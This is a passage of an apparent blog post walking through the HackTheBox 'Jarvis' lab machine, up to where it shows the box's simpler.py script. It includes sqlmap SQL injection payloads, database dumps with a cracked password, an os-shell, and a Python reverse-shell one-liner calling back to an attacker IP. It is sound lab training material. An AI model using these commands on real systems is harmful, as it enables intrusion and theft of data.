@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Jarvis | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2019/11/htb-jarvis.html" title="Read more" class="entry-title-link">
+                HTB: Jarvis</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2019-11-10T12:30:00+01:00">10 Nov 2019</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/sqli.html" title="Read more with the label SQLi" class="meta-link">SQLi</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 10 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2019.10/jarvis_card.png" alt="Jarvis Card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/194">Jarvis</a>.
+This box is rated as a medium box. It implies a dead end, some SQL injection, a
+homemade script and a SUID binary.</p>
+
+<div class="toc">
+<ul>
+<li><a href="#recon">Recon</a></li>
+<li><a href="#web">Web</a><ul>
+<li><a href="#on-port-64999">On port 64999</a></li>
+<li><a href="#on-port-80">On port 80</a></li>
+</ul>
+</li>
+<li><a href="#getting-user">Getting user</a></li>
+<li><a href="#lets-get-root">Let's get root</a></li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="recon">Recon</h1>
+<p>Let us start as always by a <code>nmap</code> scan the ports 22 (SSH), 80 (HTTP) and 64999
+are open:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nmap -p- 10.10.10.143</span>
+<span class="code-line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-03 13:46 CEST</span>
+<span class="code-line">Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span>
+<span class="code-line">SYN Stealth Scan Timing: About 62.32% done; ETC: 13:48 (0:00:42 remaining)</span>
+<span class="code-line">Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span>
+<span class="code-line">SYN Stealth Scan Timing: About 66.39% done; ETC: 13:48 (0:00:36 remaining)</span>
+<span class="code-line">Nmap scan report for 10.10.10.143</span>
+<span class="code-line">Host is up (0.093s latency).</span>
+<span class="code-line">Not shown: 65532 closed ports</span>
+<span class="code-line">PORT      STATE SERVICE</span>
+<span class="code-line">22/tcp    open  ssh</span>
+<span class="code-line">80/tcp    open  http</span>
+<span class="code-line">64999/tcp open  unknown</span>
+<span class="code-line"></span>
+<span class="code-line">Nmap done: 1 IP address (1 host up) scanned in 101.63 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us see what services are running on this ports (especially the last one). It
+a simple HTTP service.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nmap -p 22,80,64999 -sSV 10.10.10.143</span>
+<span class="code-line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-03 13:51 CEST</span>
+<span class="code-line">Nmap scan report for 10.10.10.143</span>
+<span class="code-line">Host is up (0.088s latency).</span>
+<span class="code-line"></span>
+<span class="code-line">PORT      STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span>
+<span class="code-line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span>
+<span class="code-line">64999/tcp open  http    Apache httpd 2.4.25 ((Debian))</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line">Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="web">Web</h1>
+<h2 id="on-port-64999">On port 64999</h2>
+<p>The page on the web service on port 64999 is only saying that we have been
+banned for 90 seconds.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>curl http://10.10.10.143:64999/</span>
+<span class="code-line">Hey you have been banned for 90 seconds, don&#39;t be bad</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="on-port-80">On port 80</h2>
+<p>The website is a "classical" hotel homepage.</p>
+<p><img alt="Jarvis homepage" src="/media/2019.10/jarvis_1.png"></p>
+<p>We can checkout rooms. We notice that there is a <code>cod</code> GET parameter (in the
+URL).
+Moreover if we put a <code>-1</code> at the end of the URL we get to the previous room. For
+instance the URL <code>http://10.10.10.143/room.php?cod=5-1</code> give us exactly the same
+room as the <code>http://10.10.10.143/room.php?cod=4</code> URL. This is symptomatic of an
+SQL injection.</p>
+<p><img alt="Jarvis room id 4" src="/media/2019.10/jarvis_2.png"></p>
+<p><img alt="Jarvis room id 5" src="/media/2019.10/jarvis_3.png"></p>
+<p><img alt="Jarvis room id 5-1" src="/media/2019.10/jarvis_4.png"></p>
+<h1 id="getting-user">Getting user</h1>
+<p>We launch <code>sqlmap</code> against the page, it confirm the SQL injection:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">GET parameter &#39;cod&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:</span>
+<span class="code-line">---</span>
+<span class="code-line">Parameter: cod (GET)</span>
+<span class="code-line">    Type: boolean-based blind</span>
+<span class="code-line">    Title: AND boolean-based blind - WHERE or HAVING clause</span>
+<span class="code-line">    Payload: cod=5-1 AND 9103=9103</span>
+<span class="code-line"></span>
+<span class="code-line">    Type: time-based blind</span>
+<span class="code-line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span>
+<span class="code-line">    Payload: cod=5-1 AND (SELECT 1494 FROM (SELECT(SLEEP(5)))doUk)</span>
+<span class="code-line"></span>
+<span class="code-line">    Type: UNION query</span>
+<span class="code-line">    Title: Generic UNION query (NULL) - 7 columns</span>
+<span class="code-line">    Payload: cod=-8368 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a707871,0x727a50526445566e634476524a594655416e436156515a667a77797962676967515668766e6e626c,0x71707a7671),NULL-- AwXR</span>
+<span class="code-line">---</span>
+<span class="code-line">web server operating system: Linux Debian 9.0 (stretch)</span>
+<span class="code-line">web application technology: PHP, Apache 2.4.25</span>
+<span class="code-line">back-end DBMS: MySQL &gt;= 5.0.12</span>
+<span class="code-line"></code></pre></div>
+
+<p>We list the available database:</p>
+<ul>
+<li>hotel</li>
+<li>infomration_schema</li>
+<li>mysq</li>
+<li>performance_schema</li>
+</ul>
+<p>The SQLmap command is the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1 --dbs</span>
+<span class="code-line">available databases [4]:</span>
+<span class="code-line">[*] hotel</span>
+<span class="code-line">[*] information_schema</span>
+<span class="code-line">[*] mysql</span>
+<span class="code-line">[*] performance_schema</span>
+<span class="code-line"></code></pre></div>
+
+<p>We list the table for the <code>hotel</code> database and dump it, nothing interesting.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --tables</span>
+<span class="code-line">Database: hotel</span>
+<span class="code-line">[1 table]</span>
+<span class="code-line">+------+</span>
+<span class="code-line">| room |</span>
+<span class="code-line">+------+</span>
+<span class="code-line"></span>
+<span class="code-line">sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --dump</span>
+<span class="code-line">Database: hotel</span>
+<span class="code-line">Table: room</span>
+<span class="code-line">[6 entries]</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We dump the mysqluser table and crack the password hash (with the sqlmap
+cracking function):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D mysql -T user --dump</span>
+<span class="code-line">Database: mysql</span>
+<span class="code-line">Table: user</span>
+<span class="code-line">[1 entry]</span>
+<span class="code-line">*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 (imissyou)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can then connect to the phpmyadmin as DBadmin:</p>
+<p><img alt="Jarvis phpmyadmin" src="/media/2019.10/jarvis_5.png"></p>
+<p>This does not give us a shell. Let us try something different: the <code>--os-shell</code>
+option from <code>sqlmap</code>. We got a shell!</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  --os-shell</span>
+<span class="code-line">os-shell&gt; id</span>
+<span class="code-line">command standard output: &#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#39;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We start enumeration a bit and found that we can call a binary as the pepper
+user with <code>sudo</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>os-shell&gt; ls /home/</span>
+<span class="code-line">command standard output: &#39;pepper&#39;</span>
+<span class="code-line">os-shell&gt; ls /home/pepper/</span>
+<span class="code-line">command standard output:</span>
+<span class="code-line">---</span>
+<span class="code-line">Web</span>
+<span class="code-line">user.txt</span>
+<span class="code-line">---</span>
+<span class="code-line">os-shell&gt; cat /home/pepper/user.txt</span>
+<span class="code-line">command standard output: &#39;cat: /home/pepper/user.txt: Permission denied&#39;</span>
+<span class="code-line">os-shell&gt; ls -al /home/pepper/</span>
+<span class="code-line">command standard output:</span>
+<span class="code-line">---</span>
+<span class="code-line">total 32</span>
+<span class="code-line">drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .</span>
+<span class="code-line">drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..</span>
+<span class="code-line">lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; /dev/null</span>
+<span class="code-line">-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout</span>
+<span class="code-line">-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc</span>
+<span class="code-line">drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano</span>
+<span class="code-line">-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile</span>
+<span class="code-line">drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web</span>
+<span class="code-line">-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt</span>
+<span class="code-line">---</span>
+<span class="code-line">os-shell&gt; sudo -l</span>
+<span class="code-line">command standard output:</span>
+<span class="code-line">---</span>
+<span class="code-line">Matching Defaults entries for www-data on jarvis:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User www-data may run the following commands on jarvis:</span>
+<span class="code-line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span>
+<span class="code-line">---</span>
+<span class="code-line"></code></pre></div>
+
+<p>In oder to have a better shell, we use a python reverseshell:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>export RHOST=&quot;10.10.15.31&quot;;export RPORT=4444;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for www-data on jarvis:</span>
+<span class="code-line">    env_reset, mail_badpass,</span>
+<span class="code-line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User www-data may run the following commands on jarvis:</span>
+<span class="code-line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span>
+<span class="code-line">$ sudo -u pepper /var/www/Admin-Utilities/simpler.py</span>
+<span class="code-line"></code></pre></div>
+
+<p>The <code>simpler.py</code> script is the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/env python3</span></span>
+<span class="code-line"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span></span>
+<span class="code-line"><span class="kn">import</span> <span class="nn">sys</span></span>
+<span class="code-line"><span class="kn">import</span> <span class="nn">os</span></span>
+<span class="code-line"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">listdir</span></span>
+<span class="code-line"><span class="kn">import</span> <span class="nn">re</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">show_help</span><span class="p">():</span></span>
+<span class="code-line">    <span class="n">message</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span></span>
+<span class="code-line"><span class="s1">********************************************************</span></span>
+<span class="code-line"><span class="s1">* Simpler   -   A simple simplifier ;)                 *</span></span>
+<span class="code-line"><span class="s1">* Version 1.0                                          *</span></span>
+<span class="code-line"><span class="s1">********************************************************</span></span>
+<span class="code-line"><span class="s1">Usage:  python3 simpler.py [options]</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="s1">Options:</span></span>
+<span class="code-line"><span class="s1">    -h/--help   : This help</span></span>
+<span class="code-line"><span class="s1">    -s          : Statistics</span></span>
+<span class="code-line"><span class="s1">    -l          : List the attackers IP</span></span>
+<span class="code-line"><span class="s1">    -p          : ping an attacker IP</span></span>
+<span class="code-line"><span class="s1">    &#39;&#39;&#39;</span></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">show_header</span><span class="p">():</span></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;***********************************************</span></span>
+<span class="code-line"><span class="s1">    _                 _</span></span>
+<span class="code-line"><span class="s1">___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span></span>
+<span class="code-line"><span class="s1">/ __| | &#39;_ ` _ \| &#39;_ \| |/ _ \ &#39;__| &#39;_ \| | | |</span></span>
+<span class="code-line"><span class="s1">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span></span>
+<span class="code-line"><span class="s1">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span></span>
+<span class="code-line"><span class="s1">                |_|               |_|    |___/</span></span>
+<span class="code-line"><span class="s1">                                @ironhackers.es</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="s1">***********************************************</span></span>
+<span class="code-line"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">show_statistics</span><span class="p">():</span></span>
+<span class="code-line">    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home/pepper/Web/Logs/&#39;</span></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Statistics</span><span class="se">\n</span><span class="s1">-----------&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">count</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">listed_files</span><span class="p">)</span></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Number of Attackers: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">))</span></span>
+<span class="code-line">    <span class="n">level_1</span> <span class="o">=</span> <span class="mi">0</span></span>
+<span class="code-line">    <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[]</span></span>
+<span class="code-line">    <span class="n">reks</span> <span class="o">=</span> <span class="p">[]</span></span>
+<span class="code-line">    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span></span>
+<span class="code-line">    <span class="n">req</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span></span>
+<span class="code-line">    <span class="n">rek</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">level2</span><span class="p">,</span> <span class="n">rek</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">fecha</span><span class="p">,</span> <span class="n">requ</span> <span class="o">=</span> <span class="n">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">ip</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span></span>
+<span class="code-line">        <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span></span>
+<span class="code-line">            <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span></span>
+<span class="code-line">            <span class="n">req</span> <span class="o">=</span> <span class="n">requ</span></span>
+<span class="code-line">            <span class="n">ip2</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span></span>
+<span class="code-line">        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span></span>
+<span class="code-line">            <span class="n">level_1</span> <span class="o">=</span> <span class="n">level2</span></span>
+<span class="code-line">            <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">ip</span><span class="p">]</span></span>
+<span class="code-line">            <span class="n">reks</span><span class="o">=</span><span class="p">[</span><span class="n">rek</span><span class="p">]</span></span>
+<span class="code-line">        <span class="k">elif</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span></span>
+<span class="code-line">            <span class="n">ip_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span></span>
+<span class="code-line">            <span class="n">reks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">rek</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Most Risky:&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ip_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span></span>
+<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;More than 1 ip found&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">cont</span> <span class="o">=</span> <span class="mi">0</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ip_list</span><span class="p">:</span></span>
+<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;    &#39;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">&#39; - Attack Level : &#39;</span> <span class="o">+</span> <span class="n">level_1</span> <span class="o">+</span> <span class="s1">&#39; Request: &#39;</span> <span class="o">+</span> <span class="n">reks</span><span class="p">[</span><span class="n">cont</span><span class="p">])</span></span>
+<span class="code-line">        <span class="n">cont</span> <span class="o">=</span> <span class="n">cont</span> <span class="o">+</span> <span class="mi">1</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Most Recent: &#39;</span> <span class="o">+</span> <span class="n">ip2</span> <span class="o">+</span> <span class="s1">&#39; --&gt; &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">req</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">list_ip</span><span class="p">():</span></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Attackers</span><span class="se">\n</span><span class="s1">-----------&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home/pepper/Web/Logs/&#39;</span></span>
+<span class="code-line">    <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">level</span><span class="p">,</span><span class="n">req</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span></span>
+<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; - Attack Level : &#39;</span> <span class="o">+</span> <span class="n">level</span><span class="p">)</span></span>
+<span class="code-line">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span></span>
+<span class="code-line">    <span class="n">req</span><span class="o">=</span><span class="s1">&#39;&#39;</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span></span>
+<span class="code-line">        <span class="k">if</span> <span class="s1">&#39;Level&#39;</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span></span>
+<span class="code-line">            <span class="n">fecha</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">7</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span></span>
+<span class="code-line">            <span class="n">regex</span> <span class="o">=</span> <span class="s1">&#39;(\d+)-(.*)-(\d+)(.*)&#39;</span></span>
+<span class="code-line">            <span class="n">logEx</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">fecha</span><span class="p">)</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span></span>
+<span class="code-line">            <span class="n">mes</span> <span class="o">=</span> <span class="n">to_dict</span><span class="p">(</span><span class="n">logEx</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span></span>
+<span class="code-line">            <span class="n">fecha</span> <span class="o">=</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">mes</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span></span>
